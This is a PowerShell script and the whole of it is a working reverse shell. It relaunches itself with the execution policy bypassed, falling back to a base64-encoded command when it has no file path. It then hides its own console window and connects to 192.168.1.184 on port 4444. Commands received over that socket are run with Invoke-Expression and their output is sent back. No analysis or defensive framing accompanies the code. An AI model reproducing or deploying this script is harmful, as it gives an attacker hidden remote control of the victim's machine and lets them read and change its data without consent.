function Test-IsBypassProcess {
    try { (Get-ExecutionPolicy -Scope Process -ErrorAction Stop) -in 'Bypass','Unrestricted' }
    catch { $false }
}

if (-not (Test-IsBypassProcess)) {
    $scriptPath = $MyInvocation.MyCommand.Path
    if ($scriptPath) {
        $escapedArgs = $args | ForEach-Object { if ($_ -match '\s') { '"' + $_.Replace('"','\"') + '"' } else { $_ } } -join ' '
        $exe = (Get-Command pwsh -ErrorAction SilentlyContinue)?.Source ?? (Get-Command powershell.exe).Source
        $proc = Start-Process -FilePath $exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" $escapedArgs" -Wait -PassThru
        exit $proc.ExitCode
    }

    $scriptText = $MyInvocation.MyCommand.Definition
    if (-not $scriptText) {
        exit 1
    }

    $argsTemp = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "ps_args_{0}.json" -f [System.Guid]::NewGuid())
    $args | ConvertTo-Json -Compress | Set-Content -Path $argsTemp -Encoding UTF8

    $wrapper = @"
`$argsFromFile = (Get-Content -Raw -Encoding UTF8 '$argsTemp' | ConvertFrom-Json)
if (`$argsFromFile) { `$script:args = @(); `$script:args += `$argsFromFile }
try {
$scriptText
} finally {
Remove-Item -LiteralPath '$argsTemp' -ErrorAction SilentlyContinue
}
"@

    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($wrapper))

    $exe = (Get-Command pwsh -ErrorAction SilentlyContinue)?.Source ?? (Get-Command powershell.exe -ErrorAction SilentlyContinue).Source
    if (-not $exe) { Write-Error "No PowerShell executable found."; exit 1 }

    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $exe
    $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $b64"
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError  = $true
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true

    $proc = New-Object System.Diagnostics.Process
    $proc.StartInfo = $psi
    $proc.EnableRaisingEvents = $true

    $proc.add_OutputDataReceived( { param($s,$e) if ($e.Data -ne $null) { Write-Output $e.Data } } )
    $proc.add_ErrorDataReceived(  { param($s,$e) if ($e.Data -ne $null) { Write-Error  $e.Data } } )

    if (-not $proc.Start()) {
        exit 1
    }

    $proc.BeginOutputReadLine()
    $proc.BeginErrorReadLine()
    $proc.WaitForExit()

    $exitCode = $proc.ExitCode
    Remove-Item -LiteralPath $argsTemp -ErrorAction SilentlyContinue
    exit $exitCode
}

$hwnd = (Get-Process -Id $PID).MainWindowHandle
if ($hwnd -ne 0) {
    $signature = @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
    Add-Type $signature
    [WinAPI]::ShowWindow($hwnd, 0)  # 0 = SW_HIDE
}

$client = New-Object System.Net.Sockets.TcpClient("192.168.1.184", 4444)
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

while ($true) {
    try {
        $command = $reader.ReadLine()
        if ($command -eq "exit" -or $command -eq $null) { break }

        $output = Invoke-Expression $command 2>&1 | Out-String

        $writer.WriteLine($output)
    } catch {
        $writer.WriteLine("Error: " + $_.Exception.Message)
    }
}

$client.Close()
